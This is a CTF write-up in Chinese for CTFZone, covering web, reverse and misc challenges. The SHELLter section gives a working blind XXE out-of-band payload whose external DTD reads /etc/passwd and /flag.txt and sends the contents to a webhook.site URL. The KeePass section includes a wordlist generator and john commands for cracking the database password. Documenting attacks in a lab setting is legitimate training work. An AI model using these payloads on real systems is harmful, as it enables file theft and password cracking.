# CTFZone
###### tags: `CTF`

## Web
### SHELLter
打開網頁後，發現是一個 command 介面，且有一些指令能用
![](https://i.imgur.com/NRmnqCm.png)

發現除了 auth 以外，其他的都不會有網路連線，而 auth 指令會送出 XML 到 login.php
![](https://i.imgur.com/e3lx7lm.png)

觀察後發現送出的程式碼部分如下:
```javascript=
auth: function (name, pass) {
    function XMLFunction(){
        var xml = '' +
            '<?xml version="1.0" encoding="UTF-8"?>' +
            '<root>' +
            '<name>' + name + '</name>' +
            '<password>' + pass + '</password>' +
            '</root>';
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
            if(xmlhttp.readyState == 4){
                console.log(xmlhttp.readyState);
                console.log(xmlhttp.responseText);
                document.getElementById('errorMessage').innerHTML = xmlhttp.responseText;
            }
        }
        xmlhttp.open("POST","login.php",true);
        xmlhttp.send(xml);
    };
    XMLFunction();
    this.echo('Error, username or password is incorrect. Try again.');
}
```

可以看到不管怎麼送都會在螢幕上顯示 `Error, username or password is incorrect. Try again.`，所以很肯定不是要拿到使用者的帳密，且似乎沒有送資料給 admin bot 的部分，推測是後端型攻擊

由於有 XML 的關係，推測這題可以使用 XXE，由於無法直接看到回傳資料的關係，推測算是一種 blind XXE

使用 XXE OOB 攻擊 (引用外部 DTD)，腳本參考 [payload all the thing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-attack-yunusov-2013)

首先在一台 server 上建立以下 dtd
```xml=
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'https://webhook.site/490325eb-1890-4de3-8e4a-ed536296f84e/?%file;'>">
%all;
```

封包 payload:
```xml=
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data SYSTEM "https://mymbs.ywcweb.engineer/attachments/my.dtd">
<data>&send;</data>
<root><name>a</name><password>b</password></root>
```

不知道為什麼 webhook 收不到，但在回應中有看到我們要的資訊
![](https://i.imgur.com/QzCVuHT.png)

透過通靈和測試，猜測 flag 檔案位置為 `/flag.txt`，修改 dtd 為
```xml=
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % all "<!ENTITY send SYSTEM 'https://webhook.site/490325eb-1890-4de3-8e4a-ed536296f84e/?%file;'>">
%all;
```

payload 保持不變

成功收到 flag
![](https://i.imgur.com/tAQLHni.png)

CTFZone{0h_dud3_d1d_u_c_th1s_p3rf3ct_fr0nt}

### Social note
感覺是要竄改 flask session

但是在開源程式碼中的 `SECRET_KEY` 無法驗證網頁上現在在跑的 session，不確定是甚麼原因

![](https://i.imgur.com/iZr5XLG.png)

加解密工具: https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py

## reverse
### shitty_crackme
![](https://i.imgur.com/ODbgHjR.png)

還在找QQ
## Misc
### statham
`Task 1`
![](https://i.imgur.com/vKVDMgf.jpg)
看起來就是要 brute force 他給的 KeePass 檔

用 Kali的john_the_ripper 拿著我們用 python 跑出的dictionary 爆破密碼進 Task 2(~~目前還爆不出來，爆了4小時了~~)

```python=
import string
import itertools

# strings match the regex
chars = string.lowercase + string.uppercase + string.digits + '!@#$%^&*'
f = open('dict.txt','a')

all_permutations = list(itertools.permutations(chars,1))+ list(itertools.permutations(chars,2))+ list(itertools.permutations(chars,3))

for p in all_permutations:
    f.write(''.join(p)+'\n')
```
目前下面這項第二種嘗試 Brute force 也失敗，可能工具要另外找
```shell=
keepass2john Database.kdbx > kp && john -format=keepass kp > output && john kp >output && cat output
```
Ref:`
https://tzusec.com/cracking-keepass-database/
https://www.megabeets.net/pragyan-ctf-vault/
`